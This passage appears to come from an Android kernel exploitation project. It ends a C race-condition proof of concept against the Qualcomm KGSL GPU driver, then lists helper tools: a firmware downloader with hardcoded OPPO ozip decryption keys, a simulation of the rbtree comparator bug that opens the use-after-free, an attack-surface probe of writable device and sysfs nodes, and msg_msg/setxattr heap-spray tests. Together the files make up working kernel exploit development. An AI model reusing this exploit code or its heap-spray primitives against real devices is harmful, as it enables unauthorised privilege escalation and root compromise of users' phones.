	lg("racer join 完成 ret=%ld errno=%d", rs.result, rs.saved_errno);

	if (p == MAP_FAILED && mmap_errno == ENODEV) {
		lg(">>> RACE WON (ENODEV=19)，立即退出，不触碰悬垂 PTE <<<");
		_exit(0);
	}
	lg("结果: %s (hit 判据为 ENODEV 19)",
	   (p == MAP_FAILED && mmap_errno == ENOMEM) ? "MISS (ENOMEM)" :
						       "OTHER");

	if (p != MAP_FAILED)
		munmap(p, (size_t)ov_ms);
	munmap(ph_vma, (size_t)ph_ms);
	munmap(bogus_vma, PAGE * 3);
	{
		struct kgsl_gpuobj_free fr;
		memset(&fr, 0, sizeof(fr));
		fr.id = ov_id;
		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
		fr.id = ph_id;
		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
		fr.id = uaf_id;
		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
	}
	lg("清理完成，退出");
	close(fd);
	return 0;
}

```

`tools/ozip_range_extract.py`:

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ozip_range_extract.py — 通过 HTTP Range 只下载 OPPO 固件包中的指定文件。

支持两种容器格式
----------------
1. 加密 .ozip（默认）：文件头 0x1050 字节明文，其后按 0x4010 字节分块，
   每块 = 16 字节 AES-128-ECB 密文 + 0x4000 字节明文。ECB 各块独立，
   因此任意字节区间都能在本地还原，无需下载整个固件包。
2. 标准 .zip（--plain-zip）：component-ota 下发的全量包即为此格式，
   无头部、无加密，直接按 ZIP 结构做分段读取。

依赖：Python >= 3.8, curl, pycryptodome（仅 ozip 模式需要）

当前基线
--------
实机 ADB 确认设备为 PCGM00_11_F.16，故默认 URL / 输出目录均指向 F.16。
C.17 固件产物已于 2026-11-13 清理；tools/ 下其余脚本（deep_unpack.py、
kallsyms_recover.py、solve_names.py、fdt_chosen.py 等）仍硬编码
`firmware_C17_root/` 与 `unpacked_C17/`，重跑前必须先把路径指向 F.16。

用法
----
    # 当前基线 F.16（默认 URL，按 .zip 后缀自动识别为 plain ZIP）
    python tools/ozip_range_extract.py --list
    python tools/ozip_range_extract.py --out firmware_F16

    # 历史 C.17 加密 ozip（显式给 URL，按 .ozip 后缀自动识别）
    python tools/ozip_range_extract.py --url <C17_ozip_url> --out <dir> --list

    # 提取任意指定条目 / 强制指定格式
    python tools/ozip_range_extract.py --files boot.img firmware-update/dtbo.img
    python tools/ozip_range_extract.py --plain-zip --url <url> --out <dir>
    python tools/ozip_range_extract.py --ozip --key <32_hex> --url <url>

密钥说明
--------
内置密钥表来自 bkerler/oppo_ozip_decrypt (MIT)。K3 / Reno 使用
ACAC1E13A12531AE4A1B21BB31C13C21，脚本会用首个密文块自动验证
（解密后应为 PK\\x03\\x04）。--plain-zip 模式不需要密钥。
"""
from __future__ import annotations

import argparse
import binascii
import hashlib
import json
import os
import struct
import subprocess
import sys
import tempfile
import zlib

try:
    from Crypto.Cipher import AES
except ImportError:
    AES = None

# 当前有效基线：实机 ADB 确认的 PCGM00_11_F.16（component-ota 全量包）
DEFAULT_URL = (
    'https://gauss-componentotacostmanual-cn.allawnfs.com/'
    'remove-d6d964be26dc3369433b90dcaf671314/component-ota/25/04/01/'
    'c428fe1c57ee4d2f9a84e5cca926fde6.zip'
)
DEFAULT_REFERER = 'https://www.coloros.com/rom/firmware?id=190'
DEFAULT_OUT = 'firmware_F16'
DEFAULT_FILES = [
    'boot.img',
    'firmware-update/vbmeta.img',
    'META-INF/com/android/metadata',
    'META-INF/com/google/android/updater-script',
    'META-INF/com/google/android/removable_images.txt',
]

OZIP_HDR = 0x1050      # 加密 ozip 明文头长度
BLK = 0x4010           # 加密分块长度
ENC = 16               # 每块被加密的字节数
TAIL_WINDOW = 256 * 1024
MERGE_GAP = 2 * 1024 * 1024

# 来自 bkerler/oppo_ozip_decrypt 的已知密钥；首个为 Reno / K3
KEYS = [
    'ACAC1E13A12531AE4A1B21BB31C13C21',  # Reno, K3
    'D6EECF0AE5ACD4E0E9FE522DE7CE381E',
    'D6ECCF0AE5ACD4E0E92E522DE7C1381E',
    'D6DCCF0AD5ACD4E0292E522DB7C1381E',
    'D7DCCE1AD4AFDCE2393E5161CBDC4321',
    'D7DBCE2AD4ADDCE1393E5521CBDC4321',
    'D4D2CD61D4AFDCE13B5E01221BD14D20',
    '261CC7131D7C1481294E532DB752381E',
    '1CA21E12271335AE33AB81B2A7B14622',
    'D4D2CE11D4AFDCE13B3E0121CBD14D20',
    '1C4C1EA3A12531AE491B21BB31613C11',
    '1C4A11A3A12513AE441B23BB31513121',
    '2442CE821A4F352E33AE81B22BC1462E',
    'ACAC1E13A72431AE4A1B22BBA1C1C6A2',
    '1C4411A3A12533AE441B21BB31613C11',
    '55EEAA33112133AE441B23BB31513121',
]


class NeedWiderWindow(Exception):
    def __init__(self, cd_phys: int):
        self.cd_phys = cd_phys


def curl_range(url: str, referer: str, start: int, end: int, plain: bool) -> bytes:
    """取 [start, end]（含）区间，要求服务端返回 206。

    注意：部分 OPPO CDN 的 WAF 会对自定义 UA / Referer 返回 403，
    裸请求反而正常，因此 plain-zip 模式使用最少的请求头。
    """
    fd, path = tempfile.mkstemp(prefix='range_', suffix='.bin')
    os.close(fd)
    try:
        cmd = ['curl', '-sS', '--fail', '--max-time', '600']
        if not plain:
            cmd += ['-A', 'Mozilla/5.0', '-H', 'Referer: ' + referer]
        cmd += ['-H', 'Range: bytes=%d-%d' % (start, end),
                '-o', path, '-w', '%{http_code}', url]
        res = subprocess.run(cmd, capture_output=True, text=True)
        code = res.stdout.strip()
        if res.returncode != 0 or code != '206':
            raise RuntimeError('Range %d-%d failed: HTTP %s, %s' %
                               (start, end, code, res.stderr.strip()[:200]))
        with open(path, 'rb') as f:
            return f.read()
    finally:
        try:
            os.remove(path)
        except OSError:
            pass


def curl_head(url: str, referer: str, plain: bool) -> dict:
    cmd = ['curl', '-sSI', '--max-time', '90']
    if not plain:
        cmd += ['-A', 'Mozilla/5.0', '-H', 'Referer: ' + referer]
    cmd.append(url)
    res = subprocess.run(cmd, capture_output=True, text=True)
    if res.returncode != 0:
        return {}
    info = {}
    for line in res.stdout.splitlines():
        if ':' in line:
            k, v = line.split(':', 1)
            info[k.strip().lower()] = v.strip()
    return info


def decrypt_block_headers(buf: bytearray, phys_start: int, key, hdr: int) -> None:
    """就地解密落在区间内的每个 16 字节块头（AES-ECB，块间独立）。"""
    if key is None:
        return
    cipher = AES.new(key, AES.MODE_ECB)
    first_k = (phys_start - hdr) // BLK
    last_k = (phys_start + len(buf) - 1 - hdr) // BLK
    for k in range(first_k, last_k + 1):
        off = hdr + k * BLK - phys_start
        if 0 <= off and off + ENC <= len(buf):
            buf[off:off + ENC] = cipher.decrypt(bytes(buf[off:off + ENC]))


def aligned_start(phys_start: int, plain: bool) -> int:
    """ozip 需向下对齐到块边界以完整包含 16 字节块头；plain ZIP 不需要。"""
    if plain:
        return phys_start
    return OZIP_HDR + ((phys_start - OZIP_HDR) // BLK) * BLK


def parse_central_directory(tail: bytes, phys_start: int, key, hdr: int) -> dict:
    buf = bytearray(tail)
    decrypt_block_headers(buf, phys_start, key, hdr)
    e = buf.rfind(b'PK\x05\x06')
    if e < 0:
        raise RuntimeError('EOCD not found in tail window')
    (_, _, _, _, n_total, cd_size, cd_off, _) = struct.unpack_from(
        '<IHHHHIIH', buf, e)
    cd_phys = cd_off + hdr
    if cd_phys < phys_start:
        raise NeedWiderWindow(cd_phys)
    p = cd_phys - phys_start
    entries = {}
    for _ in range(n_total):
        if p + 46 > len(buf) or buf[p:p + 4] != b'PK\x01\x02':
            break
        (_, _, _, _flags, method, _mt, _md, crc, csize, usize,
         nlen, elen, clen, _d, _ia, _ea, lho) = struct.unpack_from(
            '<IHHHHHHIIIHHHHHII', buf, p)
        name = bytes(buf[p + 46:p + 46 + nlen]).decode('utf-8', 'replace')
        entries[name] = dict(csize=csize, usize=usize, lho=lho,
                             method=method, crc=crc)
        p += 46 + nlen + elen + clen
    return dict(entries=entries, cd_phys=cd_phys, cd_size=cd_size,
                eocd_phys=phys_start + e, count=n_total)


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument('--url', default=DEFAULT_URL)
    ap.add_argument('--referer', default=DEFAULT_REFERER)
    ap.add_argument('--out', default=DEFAULT_OUT)
    ap.add_argument('--key', help='AES-128 key as 32 hex chars; auto-detected for ozip')
    ap.add_argument('--plain-zip', action='store_true',
                    help='force standard unencrypted ZIP (default auto-detected from .zip suffix)')
    ap.add_argument('--ozip', action='store_true',
                    help='force encrypted ozip (default auto-detected from .ozip suffix)')
    ap.add_argument('--size', type=int, help='package size in bytes (skip HEAD)')
    ap.add_argument('--files', nargs='+', default=DEFAULT_FILES)
    ap.add_argument('--list', action='store_true', help='list archive entries and exit')
    args = ap.parse_args()

    if args.ozip:
        plain = False
    elif args.plain_zip:
        plain = True
    else:
        plain = args.url.lower().split('?')[0].endswith('.zip')
    hdr = 0 if plain else OZIP_HDR

    head = curl_head(args.url, args.referer, plain)
    total = args.size or int(head.get('content-length', 0))
    if not total:
        raise RuntimeError('cannot determine package size; pass --size')
    print('package size : %d bytes (%.2f MiB)' % (total, total / 1048576))
    print('container    :', 'plain ZIP' if plain else 'encrypted ozip')
    print('server md5   :', head.get('x-amz-meta-filemd5') or
          head.get('x-amz-meta-content-md5') or 'n/a')
    print('accept-ranges:', head.get('accept-ranges', 'unknown (Range will be tested)'))

    # 1) 密钥（仅 ozip）
    key = None
    if not plain:
        if AES is None:
            raise RuntimeError('pycryptodome required for ozip: pip install pycryptodome')
        first = curl_range(args.url, args.referer, hdr, hdr + ENC - 1, plain)
        for k in ([args.key.upper()] if args.key else KEYS):
            pt = AES.new(binascii.unhexlify(k), AES.MODE_ECB).decrypt(first[:ENC])
            if pt[:4] in (b'PK\x03\x04', b'AVB0', b'ANDR'):
                key = binascii.unhexlify(k)
                print('AES key      :', k, '(verified, plaintext starts %r)' % pt[:4])
                break
        if key is None:
            raise RuntimeError('no matching AES key; supply --key')

    # 2) 尾部窗口，必要时扩大，直到覆盖完整中央目录
    window = TAIL_WINDOW
    while True:
        phys_start = max(0, total - window)
        tail = curl_range(args.url, args.referer, phys_start, total - 1, plain)
        try:
            cd = parse_central_directory(tail, phys_start, key, hdr)
            break
        except NeedWiderWindow as need:
            window = total - need.cd_phys + 65536
            print('widening tail window to %d bytes' % window)
            if window > total:
                raise RuntimeError('central directory window exceeds file size')
    print('tail fetched : %d bytes; %d archive entries' %
          (len(tail), len(cd['entries'])))

    if args.list:
        for name, m in sorted(cd['entries'].items(), key=lambda x: x[1]['lho']):
            print('%-62s csize=%-12d usize=%-12d lho=%d' %
                  (name, m['csize'], m['usize'], m['lho']))
        return 0

    missing = [n for n in args.files if n not in cd['entries']]
    if missing:
        raise RuntimeError('entries not found: ' + ', '.join(missing))

    # 3) 合并相邻目标区间，减少请求数
    items = sorted(((n, cd['entries'][n]) for n in args.files),
                   key=lambda x: x[1]['lho'])
    ranges = []
    for name, m in items:
        start, end = m['lho'], m['lho'] + 30 + 512 + m['csize']
        if ranges and start - ranges[-1][1] < MERGE_GAP:
            ranges[-1] = (ranges[-1][0], max(ranges[-1][1], end),
                          ranges[-1][2] + [name])
        else:
            ranges.append((start, end, [name]))

    os.makedirs(args.out, exist_ok=True)
    manifest = {
        'package_url': args.url, 'package_size_bytes': total,
        'package_md5_server_header': head.get('x-amz-meta-filemd5') or
                                     head.get('x-amz-meta-content-md5'),
        'container': 'plain ZIP' if plain else 'encrypted ozip',
        'ozip_aes_key': key.hex().upper() if key else None,
        'method': 'HTTP 206 Range + ZIP central directory parsing' +
                  ('' if plain else ' + AES-128-ECB per-0x4010-block header decryption'),
        'ranges': [], 'files': [],
    }
    downloaded = 0
    for idx, (start, end, names) in enumerate(ranges):
        a = aligned_start(start + hdr, plain)
        b = end + hdr - 1
        raw = curl_range(args.url, args.referer, a, b, plain)
        downloaded += len(raw)
        buf = bytearray(raw)
        decrypt_block_headers(buf, a, key, hdr)
        base = a - hdr
        manifest['ranges'].append(dict(index=idx, byte_start=a, byte_end=b,
                                       bytes=len(raw), entries=names))
        print('range %d: %d bytes -> %s' % (idx, len(raw), ', '.join(names)))

        for name in names:
            m = cd['entries'][name]
            i = m['lho'] - base
            if buf[i:i + 4] != b'PK\x03\x04':
                raise RuntimeError('bad local header for ' + name)
            nlen, elen = struct.unpack_from('<HH', buf, i + 26)
            ds = i + 30 + nlen + elen
            comp = bytes(buf[ds:ds + m['csize']])
            raw_file = zlib.decompress(comp, -15) if m['method'] == 8 else comp
            if len(raw_file) != m['usize'] or \
                    (zlib.crc32(raw_file) & 0xffffffff) != m['crc']:
                raise RuntimeError('CRC/size verification FAILED for ' + name)
            dest = os.path.join(args.out, *name.split('/'))
            os.makedirs(os.path.dirname(dest) or '.', exist_ok=True)
            with open(dest, 'wb') as f:
                f.write(raw_file)
            manifest['files'].append(dict(
                name=name, size=len(raw_file), crc32='%08x' % m['crc'],
                sha256=hashlib.sha256(raw_file).hexdigest(),
                md5=hashlib.md5(raw_file).hexdigest(),
                compressed_size=m['csize'], zip_method=m['method']))
            print('  OK %-58s %10d bytes' % (name, len(raw_file)))

    manifest['bytes_downloaded_total'] = downloaded
    manifest['note'] = 'Full firmware package was NOT downloaded.'
    with open(os.path.join(args.out, 'manifest.json'), 'w', encoding='utf-8') as f:
        json.dump(manifest, f, ensure_ascii=False, indent=2)
    print('\ntransferred %d bytes (%.2f MiB) -> %s' %
          (downloaded, downloaded / 1048576, args.out))
    return 0


if __name__ == '__main__':
    sys.exit(main())
```

`tools/par_dl.py`:

```py
"""par_dl.py — 多连接分段并发下载（Range）。

用法: python par_dl.py URL OUT [CONNS] [PROXY]
单连接经本地代理速率受限，分段并发可显著提升聚合吞吐。
"""
import os
import sys
import threading
import urllib.request

CHUNK = 256 * 1024


def _opener(proxy):
    if proxy:
        h = urllib.request.ProxyHandler({"http": proxy, "https": proxy})
        return urllib.request.build_opener(h)
    return urllib.request.build_opener(urllib.request.ProxyHandler({}))


def get_size(url, proxy):
    req = urllib.request.Request(url, method="HEAD")
    with _opener(proxy).open(req, timeout=30) as r:
        return int(r.headers["Content-Length"]), r.headers.get("Accept-Ranges", "")


def fetch_range(url, proxy, start, end, out, idx, progress):
    op = _opener(proxy)
    pos = start
    f = open(out, "r+b")
    while pos <= end:
        stop = min(pos + CHUNK - 1, end)
        req = urllib.request.Request(url, headers={"Range": f"bytes={pos}-{stop}"})
        for attempt in range(5):
            try:
                with op.open(req, timeout=60) as r:
                    data = r.read()
                break
            except Exception:
                if attempt == 4:
                    raise
        f.seek(pos)
        f.write(data)
        f.flush()
        pos += len(data)
        with progress["lk"]:
            progress["n"] += len(data)
    f.close()


def main():
    url = sys.argv[1]
    out = sys.argv[2]
    conns = int(sys.argv[3]) if len(sys.argv) > 3 else 8
    proxy = sys.argv[4] if len(sys.argv) > 4 else "http://127.0.0.1:7890"

    size, ranges = get_size(url, proxy)
    print(f"size={size} accept_ranges={ranges!r} conns={conns}", flush=True)
    if os.path.exists(out) and os.path.getsize(out) == size:
        print("already complete")
        return

    with open(out, "wb") as f:
        f.truncate(size)

    part = size // conns
    jobs = []
    for i in range(conns):
        s = i * part
        e = size - 1 if i == conns - 1 else (i + 1) * part - 1
        jobs.append((s, e, i))

    progress = {"n": 0, "lk": threading.Lock()}

    def monitor():
        while not progress.get("stop"):
            progress["ev"].wait(10)
            progress["ev"].clear()
            with progress["lk"]:
                n = progress["n"]
            print(f"  progress {n}/{size} ({n*100.0/size:.1f}%)", flush=True)

    progress["ev"] = threading.Event()
    threading.Thread(target=monitor, daemon=True).start()

    threads = [
        threading.Thread(target=fetch_range, args=(url, proxy, s, e, out, i, progress))
        for s, e, i in jobs
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print(f"done bytes={progress['n']} expected={size}", flush=True)


if __name__ == "__main__":
    main()
```

`tools/pdf_text.py`:

```py
#!/usr/bin/env python3
"""极简 PDF 文本提取（仅用于本项目内部取论文正文，依赖 zlib + 正则）"""
import re
import sys
import zlib

path = sys.argv[1] if len(sys.argv) > 1 else ".build/refs/racing_lock.pdf"
data = open(path, "rb").read()

chunks = []
for m in re.finditer(rb"stream\r?\n", data):
    start = m.end()
    end = data.find(b"endstream", start)
    if end < 0:
        continue
    try:
        raw = zlib.decompress(data[start:end])
    except Exception:
        continue
    parts = []
    for mm in re.finditer(rb"\((?:\\.|[^\\()])*\)", raw):
        s = mm.group()[1:-1]
        s = s.replace(b"\\(", b"(").replace(b"\\)", b")")
        s = s.replace(b"\\\\", b"\\")
        parts.append(s.decode("latin-1"))
    if parts:
        chunks.append("".join(parts))

text = "\n".join(chunks)
out = path.rsplit(".", 1)[0] + ".txt"
open(out, "w", encoding="utf-8").write(text)
print("chars:", len(text), "->", out)
for kw in ["binder_proc", "inner_lock", "reclaim", "msg_msg", "pipe", "spin_lock",
           "kmalloc", "offset", "kmem_cache", "UAF", "race"]:
    print(f"  {kw:14s} {text.lower().count(kw.lower())}")
print("\n--- head ---\n" + text[:500])
```

`tools/sim_rbtree.py`:

```py
"""sim_rbtree.py — 复刻 kgsl_iommu 的 rbtree 插入与区间查找。

两个比较器不一致正是漏洞根源：
  * _insert_gpuaddr()  —— 只比较 base（节点落位）
  * set_svm_region()   —— 比较 [base, base+size) 区间（重叠检测）
本脚本按 Linux rb_insert_color 重平衡规则，模拟给定插入顺序后的树形，
并对 OVERLAP 做区间查找，判断是否"绕过"UAF。
"""

M64 = (1 << 64) - 1


class Node:
    __slots__ = ("base", "size", "name", "left", "right", "parent", "red")

    def __init__(self, base, size, name):
        self.base = base
        self.size = size
        self.name = name
        self.left = None
        self.right = None
        self.parent = None
        self.red = True  # 新节点为红

    def end(self):
        return (self.base + self.size) & M64


class RB:
    def __init__(self):
        self.root = None

    # ---------- Linux rb_insert_color ----------
    def _rotate_left(self, node):
        right = node.right
        node.right = right.left
        if right.left:
            right.left.parent = node
        right.parent = node.parent
        if not node.parent:
            self.root = right
        elif node is node.parent.left:
            node.parent.left = right
        else:
            node.parent.right = right
        right.left = node
        node.parent = right

    def _rotate_right(self, node):
        left = node.left
        node.left = left.right
        if left.right:
            left.right.parent = node
        left.parent = node.parent
        if not node.parent:
            self.root = left
        elif node is node.parent.right:
            node.parent.right = left
        else:
            node.parent.left = left
        left.right = node
        node.parent = left

    def insert(self, base, size, name):
        """等价于 _insert_gpuaddr：只按 base 比较，重复 base 返回 False"""
        parent = None
        node = self.root
        while node:
            if base == node.base:
                return False, "duplicate base"
            parent = node
            node = node.left if base < node.base else node.right
        new = Node(base, size, name)
        new.parent = parent
        if not parent:
            self.root = new
        elif base < parent.base:
            parent.left = new
        else:
            parent.right = new
        self._insert_color(new)
        self.root.red = False
        return True, "ok"

    def _insert_color(self, node):
        while node.parent and node.parent.red:
            parent = node.parent
            g = parent.parent
            if parent is g.left:
                uncle = g.right
                if uncle and uncle.red:
                    parent.red = False
                    uncle.red = False
                    g.red = True
                    node = g
                else:
                    if node is parent.right:
                        node = parent
                        self._rotate_left(node)
                        parent = node.parent
                        g = parent.parent
                    parent.red = False
                    g.red = True
                    self._rotate_right(g)
            else:
                uncle = g.left
                if uncle and uncle.red:
                    parent.red = False
                    uncle.red = False
                    g.red = True
                    node = g
                else:
                    if node is parent.left:
                        node = parent
                        self._rotate_right(node)
                        parent = node.parent
                        g = parent.parent
                    parent.red = False
                    g.red = True
                    self._rotate_left(g)
        self.root.red = False

    # ---------- kgsl_iommu_set_svm_region 的区间查找 ----------
    def find_conflict(self, addr, size, trace=None):
        node = self.root
        end = (addr + size) & M64
        while node:
            if trace is not None:
                trace.append(
                    f"  at {node.name} [{node.base:#x},{node.end():#x}) "
                    f"vs [{addr:#x},{end:#x})"
                )
            nmatch = node.base
            nend = node.end()
            if end <= nmatch:
                if trace is not None:
                    trace.append("    -> 目标完全在左，走 left")
                node = node.left
            elif nend <= addr:
                if trace is not None:
                    trace.append("    -> 目标完全在右，走 right")
                node = node.right
            else:
                return node, trace
        return None, trace

    def dump(self):
        out = []

        def rec(n, d):
            if not n:
                return
            rec(n.right, d + 1)
            out.append(
                "  " * d
                + f"{n.name:<12} [{n.base:#011x}, {n.end():#011x}) "
                + ("RED" if n.red else "BLK")
            )
            rec(n.left, d + 1)

        rec(self.root, 0)
        return "\n".join(out)


def run(label, order):
    print("=" * 72)
    print(label)
    t = RB()
    for base, size, name in order:
        ok, why = t.insert(base, size, name)
        print(f"  insert {name:<12} base={base:#011x} -> {why}")
    print("  最终树（右→根→左）:")
    print(t.dump())
    return t


UAF = (0x7001FF000, 0x10004000, "UAF")
PLACEH = (0x710204000, 0x10000, "PLACEHOLDER")     # PoC 实际用的 0x10000
PLACEH_RCA = (0x710204000, 0x10400000, "PLACEHOLDER(RCA)")
BOGUS = (0x700204000, 0xFFFFFFFFFFEFD000, "BOGUS")
OVERLAP = (0x7001FE000, 0x7000)

for label, order in [
    ("A. UAF -> PLACEHOLDER(0x10000) -> BOGUS   [我们跑的序列]", [UAF, PLACEH, BOGUS]),
    ("B. UAF -> PLACEHOLDER(0x10400000) -> BOGUS [RCA 文档]", [UAF, PLACEH_RCA, BOGUS]),
    ("C. UAF -> BOGUS -> PLACEHOLDER", [UAF, BOGUS, PLACEH]),
]:
    t = run(label, order)
    trace = []
    node, trace = t.find_conflict(*OVERLAP, trace=trace)
    print("  OVERLAP 区间查找轨迹:")
    print("\n".join(trace))
    if node:
        print(f"  => 冲突：命中 {node.name} → set_svm_region 返回 -ENOMEM（未进 map_sg）")
    else:
        print("  => 无冲突：插入成功 → 进入 kgsl_mmu_map / map_sg（漏洞路径）")
    print()
```

`tools/surface_probe.c`:

```c
/*
 * surface_probe.c — shell 域攻击面普查（只测 open，绝不 write）
 *
 * 设计原则：open(path, O_WRONLY) 会触发 DAC + SELinux 的写权限检查，但**不产生任何状态变化**。
 * 因此"open 成功即代表可写"这一判定在信息量上等价于试写，而副作用为零。
 *
 * 四部分：
 *   A. /dev 扫描 —— 字符/块设备，测 O_RDONLY；对白名单子系统追加 O_WRONLY / O_RDWR
 *   B. /proc/sys 递归（深度 3）—— 测 O_WRONLY
 *   C. /sys/module/<mod>/parameters/<param> —— 测 O_WRONLY
 *   D. 精选 /sys 路径 —— 测 O_WRONLY
 *
 * 安全边界：跳过会因 open 本身产生副作用的节点（watchdog 会因 close 触发复位、
 * console/tty 会抢占控制台、mem/kmem 等）。O_NONBLOCK 用于避免阻塞式 open。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <glob.h>

static int n_rd = 0, n_wr = 0, n_dev = 0, n_sys = 0;

/* 绝不 open 的节点：open 本身即有副作用 */
static int hard_skip(const char *n)
{
	static const char *bad[] = {
		"watchdog", "console", "ptmx", "mem", "kmem", "kmsg", "log",
		"cpu_dma_latency", "vcs", "port", "fb0", "graphics", "tty", NULL
	};
	int i;
	for (i = 0; bad[i]; i++)
		if (strncmp(n, bad[i], strlen(bad[i])) == 0)
			return 1;
	return 0;
}

/* 允许做写打开的子系统（白名单，都是有明确句柄语义、open 无副作用的） */
static int rw_allow(const char *n)
{
	static const char *ok[] = {
		"kgsl", "ion", "dma_heap", "adsprpc", "ashmem", "binder",
		"qseecom", "qcedev", "qcrypto", "spcom", "glink", "hwrng",
		"genlock", "sync", "msm_", "video", "sde", "subsys", NULL
	};
	int i;
	for (i = 0; ok[i]; i++)
		if (strstr(n, ok[i]))
			return 1;
	return 0;
}

static int try_open(const char *path, int flags)
{
	int fd = open(path, flags | O_NONBLOCK | O_CLOEXEC);
	if (fd >= 0) { close(fd); return 1; }
	return 0;
}

static void scan_dev(void)
{
	DIR *d = opendir("/dev");
	struct dirent *e;
	char p[512];

	if (!d) { printf("[A] /dev 不可读\n"); return; }
	printf("[A] /dev 扫描（白名单子系统额外测写）\n");
	while ((e = readdir(d)) != NULL) {
		struct stat st;
		int r, w = 0, rw = 0;
		char line[600];

		if (e->d_name[0] == '.') continue;
		snprintf(p, sizeof(p), "/dev/%s", e->d_name);
		if (stat(p, &st) != 0) continue;
		if (!S_ISCHR(st.st_mode) && !S_ISBLK(st.st_mode)) continue;
		if (hard_skip(e->d_name)) continue;
		n_dev++;

		r = try_open(p, O_RDONLY);
		if (rw_allow(e->d_name)) {
			w  = try_open(p, O_WRONLY);
			rw = try_open(p, O_RDWR);
		}
		if (!r && !w && !rw) continue;
		if (r) n_rd++;
		if (w || rw) { n_wr++; }
		snprintf(line, sizeof(line), "  %-28s %c%c%c  %04o", e->d_name,
			 r ? 'r' : '-', w ? 'w' : '-', rw ? 'R' : '-',
			 (unsigned)(st.st_mode & 07777));
		printf("%s\n", line);
	}
	closedir(d);
}

static void walk_proc_sys(const char *dir, int depth)
{
	DIR *d = opendir(dir);
	struct dirent *e;
	char p[512];

	if (!d || depth > 3) { if (d) closedir(d); return; }
	while ((e = readdir(d)) != NULL) {
		struct stat st;
		if (e->d_name[0] == '.') continue;
		snprintf(p, sizeof(p), "%s/%s", dir, e->d_name);
		if (lstat(p, &st) != 0) continue;
		if (S_ISDIR(st.st_mode)) {
			walk_proc_sys(p, depth + 1);
		} else if (S_ISREG(st.st_mode)) {
			n_sys++;
			if (try_open(p, O_WRONLY))
				printf("  WRITABLE %s\n", p);
		}
	}
	closedir(d);
}

static void scan_glob(const char *pat, const char *tag)
{
	glob_t g;
	size_t i;
	printf("%s\n", tag);
	if (glob(pat, 0, NULL, &g) != 0) { printf("  (无匹配)\n"); return; }
	for (i = 0; i < g.gl_pathc; i++) {
		n_sys++;
		if (try_open(g.gl_pathv[i], O_WRONLY))
			printf("  WRITABLE %s\n", g.gl_pathv[i]);
	}
	globfree(&g);
}

static void scan_list(const char **paths, const char *tag)
{
	int i;
	printf("%s\n", tag);
	for (i = 0; paths[i]; i++) {
		n_sys++;
		if (try_open(paths[i], O_WRONLY))
			printf("  WRITABLE %s\n", paths[i]);
	}
}

int main(void)
{
	static const char *syslist[] = {
		"/sys/kernel/tracing/current_tracer",
		"/sys/kernel/tracing/trace",
		"/sys/kernel/tracing/events/enable",
		"/proc/sys/kernel/kptr_restrict",
		"/proc/sys/kernel/dmesg_restrict",
		"/proc/sys/kernel/perf_event_paranoid",
		"/proc/sys/vm/drop_caches",
		"/sys/class/kgsl/kgsl-3d0/force_clk_on",
		"/sys/class/kgsl/kgsl-3d0/force_bus_on",
		"/sys/class/kgsl/kgsl-3d0/force_rail_on",
		"/sys/class/kgsl/kgsl-3d0/force_pwrscale",
		"/sys/class/kgsl/kgsl-3d0/gpuclk",
		"/sys/module/msm_performance/parameters/",
		"/sys/power/state",
		"/sys/power/wake_lock",
		"/proc/sysrq-trigger",
		NULL
	};

	printf("===== SURFACE-PROBE uid=%d =====\n", getuid());

	scan_dev();

	printf("\n[B] /proc/sys 递归（深度<=3）：仅列出可写项\n");
	walk_proc_sys("/proc/sys", 0);

	printf("\n");
	scan_glob("/sys/module/*/parameters/*", "[C] /sys/module/*/parameters/*：仅列出可写项");
	printf("\n");
	scan_list(syslist, "[D] 精选 /sys 与高危 /proc 节点");

	printf("\n---- 汇总 ----\n");
	printf("  /dev 设备节点（跳过危险项后）: %d，只读可开: %d，白名单内可写: %d\n",
	       n_dev, n_rd, n_wr);
	printf("  检查的 sysfs/procfs 项: %d\n", n_sys);
	printf("===== done（全程只 open，未 write 任何字节） =====\n");
	return 0;
}
```

`tools/t_ipc.c`:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/ipc.h>
#include <sys/msg.h>
int main(void){
	int q = msgget(IPC_PRIVATE, 0600|IPC_CREAT);
	printf("msgget=%d errno=%d (%s)\n", q, errno, strerror(errno));
	if (q >= 0) {
		struct { long mtype; char mtext[80]; } mb;
		mb.mtype = 0x100000000L; memset(mb.mtext,0x41,80);
		errno=0; int r = msgsnd(q, &mb, 80, IPC_NOWAIT);
		printf("msgsnd=%d errno=%d (%s)\n", r, errno, strerror(errno));
		msgctl(q, IPC_RMID, NULL);
	}
	return 0;
}
```

`tools/t_setxattr.c`:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/xattr.h>
int main(void)
{
	char v[96];
	memset(v, 0, sizeof(v));
	int fd = open("/data/local/tmp/xa_test", O_CREAT|O_RDWR, 0600);
	printf("open=%d errno=%d\n", fd, errno);
	if (fd >= 0) { write(fd, "a", 1); close(fd); }
	int r = setxattr("/data/local/tmp/xa_test", "user.a", v, 96, 0);
	printf("setxattr(user.a,96)=%d errno=%d (%s)\n", r, errno, strerror(errno));
	char out[128]; 
	int g = getxattr("/data/local/tmp/xa_test", "user.a", out, sizeof(out));
	printf("getxattr=%d errno=%d (%s)\n", g, errno, strerror(errno));
	int r2 = setxattr("/data/local/tmp/xa_test", "security.a", v, 96, 0);
	printf("setxattr(security.a,96)=%d errno=%d (%s)\n", r2, errno, strerror(errno));
	return 0;
}
```

`tools/t_xaslab.c`:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/xattr.h>
static long slab128(void){
	FILE *f=fopen("/proc/slabinfo","r"); char l[512],n[64]; long a,num,o,op,pp;
	if(!f) return -1;
	while(fgets(l,sizeof(l),f))
		if(sscanf(l,"%63s %ld %ld %ld %ld %ld",n,&a,&num,&o,&op,&pp)==6 && !strcmp(n,"kmalloc-128")){fclose(f);return a;}
	fclose(f);return -1;
}
